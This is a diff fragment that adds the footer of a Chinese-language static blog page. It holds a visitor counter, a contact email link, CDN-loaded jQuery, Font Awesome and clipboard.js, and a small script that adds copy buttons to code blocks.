+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
